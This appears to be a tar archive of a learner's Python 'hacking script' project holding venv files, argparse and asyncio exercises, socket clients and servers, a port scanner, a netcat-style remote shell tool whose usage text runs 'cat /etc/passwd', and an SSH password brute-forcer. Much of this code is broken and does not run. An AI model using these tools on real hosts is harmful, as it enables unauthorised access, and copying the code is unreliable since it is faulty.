hackies/README.md                                                                                   0000644 0001750 0001750 00000000021 14726403047 013314  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 # hacking script
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               hackies/async.py                                                                                    0000644 0001750 0001750 00000001072 14726403047 013533  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import asyncio

async def task1():
    print("Task 1 started")
    await asyncio.sleep(1) #Simulating some time-consuming operation
    print("Task 1 Completed")

async def task2():
    print("Task 2 started")
    await asyncio.sleep(2) #Simulating another time-consuming operation
    print("Task 2 Completed")

async def main():
    #creating tasks and scheduling them
    t1 = asyncio.create_task(task1())
    t2 = asyncio.create_task(task2())

    #allowing tasks to run consurrently
    await asyncio.gather(t1, t2)

#running the main function
asyncio.run(main())

                                                                                                                                                                                                                                                                                                                                                                                                                                                                      hackies/hakenv/                                                                                     0000755 0001750 0001750 00000000000 14726403047 013320  5                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 hackies/hakenv/bin/                                                                                 0000755 0001750 0001750 00000000000 14726403047 014070  5                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 hackies/hakenv/bin/activate                                                                         0000644 0001750 0001750 00000004022 14726403047 015611  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 # This file must be used with "source bin/activate" *from bash*
# You cannot run it directly

deactivate () {
    # reset old environment variables
    if [ -n "${_OLD_VIRTUAL_PATH:-}" ] ; then
        PATH="${_OLD_VIRTUAL_PATH:-}"
        export PATH
        unset _OLD_VIRTUAL_PATH
    fi
    if [ -n "${_OLD_VIRTUAL_PYTHONHOME:-}" ] ; then
        PYTHONHOME="${_OLD_VIRTUAL_PYTHONHOME:-}"
        export PYTHONHOME
        unset _OLD_VIRTUAL_PYTHONHOME
    fi

    # Call hash to forget past commands. Without forgetting
    # past commands the $PATH changes we made may not be respected
    hash -r 2> /dev/null

    if [ -n "${_OLD_VIRTUAL_PS1:-}" ] ; then
        PS1="${_OLD_VIRTUAL_PS1:-}"
        export PS1
        unset _OLD_VIRTUAL_PS1
    fi

    unset VIRTUAL_ENV
    unset VIRTUAL_ENV_PROMPT
    if [ ! "${1:-}" = "nondestructive" ] ; then
    # Self destruct!
        unset -f deactivate
    fi
}

# unset irrelevant variables
deactivate nondestructive

# on Windows, a path can contain colons and backslashes and has to be converted:
if [ "${OSTYPE:-}" = "cygwin" ] || [ "${OSTYPE:-}" = "msys" ] ; then
    # transform D:\path\to\venv to /d/path/to/venv on MSYS
    # and to /cygdrive/d/path/to/venv on Cygwin
    export VIRTUAL_ENV=$(cygpath "/home/safety/resources/hackies/hakenv")
else
    # use the path as-is
    export VIRTUAL_ENV="/home/safety/resources/hackies/hakenv"
fi

_OLD_VIRTUAL_PATH="$PATH"
PATH="$VIRTUAL_ENV/bin:$PATH"
export PATH

# unset PYTHONHOME if set
# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)
# could use `if (set -u; : $PYTHONHOME) ;` in bash
if [ -n "${PYTHONHOME:-}" ] ; then
    _OLD_VIRTUAL_PYTHONHOME="${PYTHONHOME:-}"
    unset PYTHONHOME
fi

if [ -z "${VIRTUAL_ENV_DISABLE_PROMPT:-}" ] ; then
    _OLD_VIRTUAL_PS1="${PS1:-}"
    PS1="(hakenv) ${PS1:-}"
    export PS1
    VIRTUAL_ENV_PROMPT="(hakenv) "
    export VIRTUAL_ENV_PROMPT
fi

# Call hash to forget past commands. Without forgetting
# past commands the $PATH changes we made may not be respected
hash -r 2> /dev/null
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              hackies/hakenv/bin/activate.csh                                                                     0000644 0001750 0001750 00000001647 14726403047 016377  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 # This file must be used with "source bin/activate.csh" *from csh*.
# You cannot run it directly.

# Created by Davide Di Blasi <davidedb@gmail.com>.
# Ported to Python 3.3 venv by Andrew Svetlov <andrew.svetlov@gmail.com>

alias deactivate 'test $?_OLD_VIRTUAL_PATH != 0 && setenv PATH "$_OLD_VIRTUAL_PATH" && unset _OLD_VIRTUAL_PATH; rehash; test $?_OLD_VIRTUAL_PROMPT != 0 && set prompt="$_OLD_VIRTUAL_PROMPT" && unset _OLD_VIRTUAL_PROMPT; unsetenv VIRTUAL_ENV; unsetenv VIRTUAL_ENV_PROMPT; test "\!:*" != "nondestructive" && unalias deactivate'

# Unset irrelevant variables.
deactivate nondestructive

setenv VIRTUAL_ENV "/home/safety/resources/hackies/hakenv"

set _OLD_VIRTUAL_PATH="$PATH"
setenv PATH "$VIRTUAL_ENV/bin:$PATH"


set _OLD_VIRTUAL_PROMPT="$prompt"

if (! "$?VIRTUAL_ENV_DISABLE_PROMPT") then
    set prompt = "(hakenv) $prompt"
    setenv VIRTUAL_ENV_PROMPT "(hakenv) "
endif

alias pydoc python -m pydoc

rehash
                                                                                         hackies/hakenv/bin/activate.fish                                                                    0000644 0001750 0001750 00000004246 14726403047 016551  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 # This file must be used with "source <venv>/bin/activate.fish" *from fish*
# (https://fishshell.com/). You cannot run it directly.

function deactivate  -d "Exit virtual environment and return to normal shell environment"
    # reset old environment variables
    if test -n "$_OLD_VIRTUAL_PATH"
        set -gx PATH $_OLD_VIRTUAL_PATH
        set -e _OLD_VIRTUAL_PATH
    end
    if test -n "$_OLD_VIRTUAL_PYTHONHOME"
        set -gx PYTHONHOME $_OLD_VIRTUAL_PYTHONHOME
        set -e _OLD_VIRTUAL_PYTHONHOME
    end

    if test -n "$_OLD_FISH_PROMPT_OVERRIDE"
        set -e _OLD_FISH_PROMPT_OVERRIDE
        # prevents error when using nested fish instances (Issue #93858)
        if functions -q _old_fish_prompt
            functions -e fish_prompt
            functions -c _old_fish_prompt fish_prompt
            functions -e _old_fish_prompt
        end
    end

    set -e VIRTUAL_ENV
    set -e VIRTUAL_ENV_PROMPT
    if test "$argv[1]" != "nondestructive"
        # Self-destruct!
        functions -e deactivate
    end
end

# Unset irrelevant variables.
deactivate nondestructive

set -gx VIRTUAL_ENV "/home/safety/resources/hackies/hakenv"

set -gx _OLD_VIRTUAL_PATH $PATH
set -gx PATH "$VIRTUAL_ENV/bin" $PATH

# Unset PYTHONHOME if set.
if set -q PYTHONHOME
    set -gx _OLD_VIRTUAL_PYTHONHOME $PYTHONHOME
    set -e PYTHONHOME
end

if test -z "$VIRTUAL_ENV_DISABLE_PROMPT"
    # fish uses a function instead of an env var to generate the prompt.

    # Save the current fish_prompt function as the function _old_fish_prompt.
    functions -c fish_prompt _old_fish_prompt

    # With the original prompt function renamed, we can override with our own.
    function fish_prompt
        # Save the return status of the last command.
        set -l old_status $status

        # Output the venv prompt; color taken from the blue of the Python logo.
        printf "%s%s%s" (set_color 4B8BBE) "(hakenv) " (set_color normal)

        # Restore the return status of the previous command.
        echo "exit $old_status" | .
        # Output the original/"old" prompt.
        _old_fish_prompt
    end

    set -gx _OLD_FISH_PROMPT_OVERRIDE "$VIRTUAL_ENV"
    set -gx VIRTUAL_ENV_PROMPT "(hakenv) "
end
                                                                                                                                                                                                                                                                                                                                                          hackies/hakenv/bin/Activate.ps1                                                                     0000644 0001750 0001750 00000021511 14726403047 016255  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 <#
.Synopsis
Activate a Python virtual environment for the current PowerShell session.

.Description
Pushes the python executable for a virtual environment to the front of the
$Env:PATH environment variable and sets the prompt to signify that you are
in a Python virtual environment. Makes use of the command line switches as
well as the `pyvenv.cfg` file values present in the virtual environment.

.Parameter VenvDir
Path to the directory that contains the virtual environment to activate. The
default value for this is the parent of the directory that the Activate.ps1
script is located within.

.Parameter Prompt
The prompt prefix to display when this virtual environment is activated. By
default, this prompt is the name of the virtual environment folder (VenvDir)
surrounded by parentheses and followed by a single space (ie. '(.venv) ').

.Example
Activate.ps1
Activates the Python virtual environment that contains the Activate.ps1 script.

.Example
Activate.ps1 -Verbose
Activates the Python virtual environment that contains the Activate.ps1 script,
and shows extra information about the activation as it executes.

.Example
Activate.ps1 -VenvDir C:\Users\MyUser\Common\.venv
Activates the Python virtual environment located in the specified location.

.Example
Activate.ps1 -Prompt "MyPython"
Activates the Python virtual environment that contains the Activate.ps1 script,
and prefixes the current prompt with the specified string (surrounded in
parentheses) while the virtual environment is active.

.Notes
On Windows, it may be required to enable this Activate.ps1 script by setting the
execution policy for the user. You can do this by issuing the following PowerShell
command:

PS C:\> Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

For more information on Execution Policies: 
https://go.microsoft.com/fwlink/?LinkID=135170

#>
Param(
    [Parameter(Mandatory = $false)]
    [String]
    $VenvDir,
    [Parameter(Mandatory = $false)]
    [String]
    $Prompt
)

<# Function declarations --------------------------------------------------- #>

<#
.Synopsis
Remove all shell session elements added by the Activate script, including the
addition of the virtual environment's Python executable from the beginning of
the PATH variable.

.Parameter NonDestructive
If present, do not remove this function from the global namespace for the
session.

#>
function global:deactivate ([switch]$NonDestructive) {
    # Revert to original values

    # The prior prompt:
    if (Test-Path -Path Function:_OLD_VIRTUAL_PROMPT) {
        Copy-Item -Path Function:_OLD_VIRTUAL_PROMPT -Destination Function:prompt
        Remove-Item -Path Function:_OLD_VIRTUAL_PROMPT
    }

    # The prior PYTHONHOME:
    if (Test-Path -Path Env:_OLD_VIRTUAL_PYTHONHOME) {
        Copy-Item -Path Env:_OLD_VIRTUAL_PYTHONHOME -Destination Env:PYTHONHOME
        Remove-Item -Path Env:_OLD_VIRTUAL_PYTHONHOME
    }

    # The prior PATH:
    if (Test-Path -Path Env:_OLD_VIRTUAL_PATH) {
        Copy-Item -Path Env:_OLD_VIRTUAL_PATH -Destination Env:PATH
        Remove-Item -Path Env:_OLD_VIRTUAL_PATH
    }

    # Just remove the VIRTUAL_ENV altogether:
    if (Test-Path -Path Env:VIRTUAL_ENV) {
        Remove-Item -Path env:VIRTUAL_ENV
    }

    # Just remove VIRTUAL_ENV_PROMPT altogether.
    if (Test-Path -Path Env:VIRTUAL_ENV_PROMPT) {
        Remove-Item -Path env:VIRTUAL_ENV_PROMPT
    }

    # Just remove the _PYTHON_VENV_PROMPT_PREFIX altogether:
    if (Get-Variable -Name "_PYTHON_VENV_PROMPT_PREFIX" -ErrorAction SilentlyContinue) {
        Remove-Variable -Name _PYTHON_VENV_PROMPT_PREFIX -Scope Global -Force
    }

    # Leave deactivate function in the global namespace if requested:
    if (-not $NonDestructive) {
        Remove-Item -Path function:deactivate
    }
}

<#
.Description
Get-PyVenvConfig parses the values from the pyvenv.cfg file located in the
given folder, and returns them in a map.

For each line in the pyvenv.cfg file, if that line can be parsed into exactly
two strings separated by `=` (with any amount of whitespace surrounding the =)
then it is considered a `key = value` line. The left hand string is the key,
the right hand is the value.

If the value starts with a `'` or a `"` then the first and last character is
stripped from the value before being captured.

.Parameter ConfigDir
Path to the directory that contains the `pyvenv.cfg` file.
#>
function Get-PyVenvConfig(
    [String]
    $ConfigDir
) {
    Write-Verbose "Given ConfigDir=$ConfigDir, obtain values in pyvenv.cfg"

    # Ensure the file exists, and issue a warning if it doesn't (but still allow the function to continue).
    $pyvenvConfigPath = Join-Path -Resolve -Path $ConfigDir -ChildPath 'pyvenv.cfg' -ErrorAction Continue

    # An empty map will be returned if no config file is found.
    $pyvenvConfig = @{ }

    if ($pyvenvConfigPath) {

        Write-Verbose "File exists, parse `key = value` lines"
        $pyvenvConfigContent = Get-Content -Path $pyvenvConfigPath

        $pyvenvConfigContent | ForEach-Object {
            $keyval = $PSItem -split "\s*=\s*", 2
            if ($keyval[0] -and $keyval[1]) {
                $val = $keyval[1]

                # Remove extraneous quotations around a string value.
                if ("'""".Contains($val.Substring(0, 1))) {
                    $val = $val.Substring(1, $val.Length - 2)
                }

                $pyvenvConfig[$keyval[0]] = $val
                Write-Verbose "Adding Key: '$($keyval[0])'='$val'"
            }
        }
    }
    return $pyvenvConfig
}


<# Begin Activate script --------------------------------------------------- #>

# Determine the containing directory of this script
$VenvExecPath = Split-Path -Parent $MyInvocation.MyCommand.Definition
$VenvExecDir = Get-Item -Path $VenvExecPath

Write-Verbose "Activation script is located in path: '$VenvExecPath'"
Write-Verbose "VenvExecDir Fullname: '$($VenvExecDir.FullName)"
Write-Verbose "VenvExecDir Name: '$($VenvExecDir.Name)"

# Set values required in priority: CmdLine, ConfigFile, Default
# First, get the location of the virtual environment, it might not be
# VenvExecDir if specified on the command line.
if ($VenvDir) {
    Write-Verbose "VenvDir given as parameter, using '$VenvDir' to determine values"
}
else {
    Write-Verbose "VenvDir not given as a parameter, using parent directory name as VenvDir."
    $VenvDir = $VenvExecDir.Parent.FullName.TrimEnd("\\/")
    Write-Verbose "VenvDir=$VenvDir"
}

# Next, read the `pyvenv.cfg` file to determine any required value such
# as `prompt`.
$pyvenvCfg = Get-PyVenvConfig -ConfigDir $VenvDir

# Next, set the prompt from the command line, or the config file, or
# just use the name of the virtual environment folder.
if ($Prompt) {
    Write-Verbose "Prompt specified as argument, using '$Prompt'"
}
else {
    Write-Verbose "Prompt not specified as argument to script, checking pyvenv.cfg value"
    if ($pyvenvCfg -and $pyvenvCfg['prompt']) {
        Write-Verbose "  Setting based on value in pyvenv.cfg='$($pyvenvCfg['prompt'])'"
        $Prompt = $pyvenvCfg['prompt'];
    }
    else {
        Write-Verbose "  Setting prompt based on parent's directory's name. (Is the directory name passed to venv module when creating the virtual environment)"
        Write-Verbose "  Got leaf-name of $VenvDir='$(Split-Path -Path $venvDir -Leaf)'"
        $Prompt = Split-Path -Path $venvDir -Leaf
    }
}

Write-Verbose "Prompt = '$Prompt'"
Write-Verbose "VenvDir='$VenvDir'"

# Deactivate any currently active virtual environment, but leave the
# deactivate function in place.
deactivate -nondestructive

# Now set the environment variable VIRTUAL_ENV, used by many tools to determine
# that there is an activated venv.
$env:VIRTUAL_ENV = $VenvDir

if (-not $Env:VIRTUAL_ENV_DISABLE_PROMPT) {

    Write-Verbose "Setting prompt to '$Prompt'"

    # Set the prompt to include the env name
    # Make sure _OLD_VIRTUAL_PROMPT is global
    function global:_OLD_VIRTUAL_PROMPT { "" }
    Copy-Item -Path function:prompt -Destination function:_OLD_VIRTUAL_PROMPT
    New-Variable -Name _PYTHON_VENV_PROMPT_PREFIX -Description "Python virtual environment prompt prefix" -Scope Global -Option ReadOnly -Visibility Public -Value $Prompt

    function global:prompt {
        Write-Host -NoNewline -ForegroundColor Green "($_PYTHON_VENV_PROMPT_PREFIX) "
        _OLD_VIRTUAL_PROMPT
    }
    $env:VIRTUAL_ENV_PROMPT = $Prompt
}

# Clear PYTHONHOME
if (Test-Path -Path Env:PYTHONHOME) {
    Copy-Item -Path Env:PYTHONHOME -Destination Env:_OLD_VIRTUAL_PYTHONHOME
    Remove-Item -Path Env:PYTHONHOME
}

# Add the venv to the PATH
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
$Env:PATH = "$VenvExecDir$([System.IO.Path]::PathSeparator)$Env:PATH"
                                                                                                                                                                                       hackies/hakenv/bin/pip                                                                              0000755 0001750 0001750 00000000376 14726403047 014614  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 #!/home/safety/resources/hackies/hakenv/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from pip._internal.cli.main import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
                                                                                                                                                                                                                                                                  hackies/hakenv/bin/pip3                                                                             0000755 0001750 0001750 00000000376 14726403047 014677  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 #!/home/safety/resources/hackies/hakenv/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from pip._internal.cli.main import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
                                                                                                                                                                                                                                                                  hackies/hakenv/bin/pip3.12                                                                          0000755 0001750 0001750 00000000376 14726403047 015120  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 #!/home/safety/resources/hackies/hakenv/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from pip._internal.cli.main import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
                                                                                                                                                                                                                                                                  hackies/hakenv/bin/python                                                                           0000777 0001750 0001750 00000000000 14726403047 016660  2python3                                                                                             ustar   safety                          safety                                                                                                                                                                                                                 hackies/hakenv/bin/python3                                                                          0000777 0001750 0001750 00000000000 14726403047 020403  2/usr/bin/python3                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 hackies/hakenv/bin/python3.12                                                                       0000777 0001750 0001750 00000000000 14726403047 017164  2python3                                                                                             ustar   safety                          safety                                                                                                                                                                                                                 hackies/hakenv/lib64                                                                                0000777 0001750 0001750 00000000000 14726403047 014651  2lib                                                                                                 ustar   safety                          safety                                                                                                                                                                                                                 hackies/hakenv/pyvenv.cfg                                                                           0000644 0001750 0001750 00000000260 14726403047 015326  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 home = /usr/bin
include-system-site-packages = false
version = 3.12.3
executable = /usr/bin/python3.12
command = /usr/bin/python3 -m venv /home/safety/resources/hackies/hakenv
                                                                                                                                                                                                                                                                                                                                                hackies/netcat.py                                                                                   0000644 0001750 0001750 00000005747 14727040026 013704  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd :
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tools'
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
        netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #upload to file
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\ #execute command
        echo 'ABC' | netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
        netcat.py -t 192.168.1.108 -p 5555 #connect server
                               
        '''))
    parser.add_argument('c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.103', help='specified IP')
    parser.add_argument('u', 'upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc =  NetCat(args, buffer.encode())
    nc.run()

class NetCat():
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input  ('>')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User Terminated')
            self.socket.close()
            sys.exit()
    

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket))
            client_thread.start()                         hackies/portscan.py                                                                                 0000644 0001750 0001750 00000000520 14727013603 014240  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import socket

target = "192.168.124.128"
port = 81

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

socket.setdefaulttimeout(1)

for port in range(1, 1000):
    try:
        result = s.connect((target, port))
        if result == None:
            print(f"Port {port}is open")
    except:
        print(f"Port {port} is closed")                                                                                                                                                                                hackies/ssh_brutforcer.py                                                                           0000644 0001750 0001750 00000006311 14726403047 015451  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import argparse
from termcolor import colored, cprint
from datetime import datetime, strftime
import asyncio
from os import path
 


#adding command line arguemnt
def get_args():
    """Function to get command-line arguments"""
    parser = argparse.ArgumentParser(description="Command-line argument parser for ssh bruteforce attack script")
    parser.add_argument("target", help="Host to attack on e.g 10.10.10.10")
    parser.add_argument("-p", "--port", dest="port", default="22", required=False, help="Port to attack on (default is: 22)")
    parser.add_argument("-w", "--wordlist", dest="wordlist", required=True, type=str, help="Path to wordlist (/path/to/wordlist.txt)")
    parser.add_argument("username", dest="username", required=True, help="Username with which to bruteforce to")
    arguments = parser.parse_args()

    return arguments


if __name__ == "__main__":
    arguments = get_args()
    if not path.exists(arguments.wordlist):
        print(colored("[-] Wordlist location is not right, \n[-] Provide the right path of the wordlist", 'red'))
        exit(1)
    
    print("\n---------------------------------------------\n----------------------------------")
    print(colored(f"[*] Target\t:", 'light_red',), end="")
    print(arguments.target)
    print((f"[*] Username\t:" "ligth_red",), end="")
    print(arguments.username)


    print(colored(f"[*] Ports\t:", "light_red",),end="")
    print("22" if not arguments.ports else arguments.ports)

    print(colored(f"[*] Wordlist\t:", "light_red",), end="")
    print(arguments.wordlist)

    print(colored(f"[*] Protocol\t:", "light_red",), end="")
    print("SSH")


    print("--------------------------------\n------------------------",)

    print(f"SSH Bruteforce starting at {datetime.now(),strftime('%d-%m-%Y %H:%M:%S')}", 'yellow')

    print("---------------------------------------------\n----------------------------------")

    asyncio.run(main(arguments.target, arguments.port, arguments.username, arguments.wordlist))



async def main(hostname, port, username, wordlist):
    tasks = []

    passwords = []

    found_flag = asyncio.Event()

    concurrency_limit = 10

    counter = 0
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password  = password.strip()
            passwords.append(password)

        
        for password in passwords:
            if counter >= concurrency_limit:
                await asyncio.wait(tasks,  return_when=asyncio.FIRST_COMPLETED)
                tasks = []

                counter = 0
                if not found_flag.set():
                    tasks.append(asyncio.create_task(ssh_bruteforce(hostname, username, password, port, found_flag)))

            await asyncio.sleep(0.5) #change value according to server.

            counter += 1

    async def ssh_bruteforce(hostname, username, password, port, found_flag):
        try:
            async with asyncssh.connect(host=hostname, username=username, password=password) as conn:
                found_flag.set()

                print(colored(f"[{port}] [ssh] host: {hostname} password: {password}", "green"))
        except Exception as err:
            print(f"[Attempt] target: {hostname} - login: {username} - password: {password}")





                                                                                                                                                                                                                                                                                                                       hackies/tcp_client.py                                                                               0000644 0001750 0001750 00000000566 14727011272 014545  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import socket

target_host = "www.google.com"
target_port = 80

#create socket object
client = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
# connect the client
client.connect((target_host, target_port))

#send some data
client.send(b"GET / HTTP/1.1\r\nHost:google.com\r\n\r\n")

#receive some data
response = client.recv(4096)

print(response.decode())
client.close()                                                                                                                                          hackies/tcp_server.py                                                                               0000644 0001750 0001750 00000001266 14727024222 014572  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import socket
import threading

IP = '0.0.0.0'
PORT = 9998

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f"[*] Listening on {IP}: {PORT}")


    while True:
        client, address = server.accept()
        print(f"[*] Accepted connection from {address[0]} {address[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

def handle_client(client_socket):
    with client_socket as sock:
        request = sock.recv(1024)
        print(f"[*] Received: {request.decode('utf-8')}")
        sock.send(b"ACK")
if __name__ == '__main__':
    main()                                                                                                                                                                                                                                                                                                                                          hackies/tuto.py                                                                                     0000644 0001750 0001750 00000004362 14726403050 013410  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import argparse

parser = argparse.ArgumentParser()
parser.add_argument("square", help="display the square of a number", type=int)
args = parser.parse_args()
print(args.square**2)


# #adding optional arguemnt #short options

parser = argparse.ArgumentParser()
parser.add_argument("-v","--verbose", help="increase output verbosity", action="store_true")
args = parser.parse_args()
if args.verbose:
    print("verbosity turned on")


#combining positional and optional argument
parser = argparse.ArgumentParser()
parser.add_argument("square", type=int, help="display the square of a given number")
parser.add_argument("-v","--verbosity", help="increase output verbosity", action="count", choices=[0,1, 2])
args = parser.parse_args()
answer = args.square**2

if args.verbosity == 2:
    print(f"the square of {args.square} is equal to {answer}")
elif args.verbosity == 1:
    print(f"{args.square}^2 == {answer}")
else:
    print(answer)

#add action=count
parser = argparse.ArgumentParser()
parser.add_argument("x", type=int, help="the base")
parser.add_argument("y", type=int, help="the exponent")
#parser.add_argument("square", type=int, help="display the square of a given number")
parser.add_argument("-v","--verbosity", action="count", default=0, help="increase output verbosity",)
args = parser.parse_args()
#answer = args.square**2
answer = args.x**args.y

if args.verbosity >= 2:   #bug fix"==" to >="
    #print(f"the square of {args.x} to the power {args.y} is equals to {answer}")
    print(f"Running '{__file__}'")
if args.verbosity >= 1:
    #print(f"{args.x}^{args.y} == {answer}")
    print(f"{args.x}^{args.y} == ", end="")
print(answer)


#adding mutually exclusive group

#combining positional and optional argument
parser = argparse.ArgumentParser("Calculate X raise to the power Y")
group = parser.add_mutually_exclusive_group()
group.add_argument("-v", "--verbose", action="store_true")
group.add_argument("-q", "--quiet", action="store_true")
parser.add_argument("x", type=int, help="the base")
parser.add_argument("y", type=int, help="exponent")
args = parser.parse_args()
answer = args.x ** args.y 

if args.quiet:
    print(answer)
elif args.verbose:
    print(f"{args.x} to the power {args.y} is equal to {answer}")
else:
    print(f"{args.x}^{args.y} == {answer}")                                                                                                                                                                                                                                                                              hackies/udp_client.py                                                                               0000644 0001750 0001750 00000000464 14727015653 014553  0                                                                                                    ustar   safety                          safety                                                                                                                                                                                                                 import socket

target_host = "127.0.0.1"
target_port = 9997

#create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Send some data
client.sendto(b"AAAABBBBCC", (target_host, target_port))

#receive some data
data, addr = client.recvfrom(4099)

print(data.decode())
client.close()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            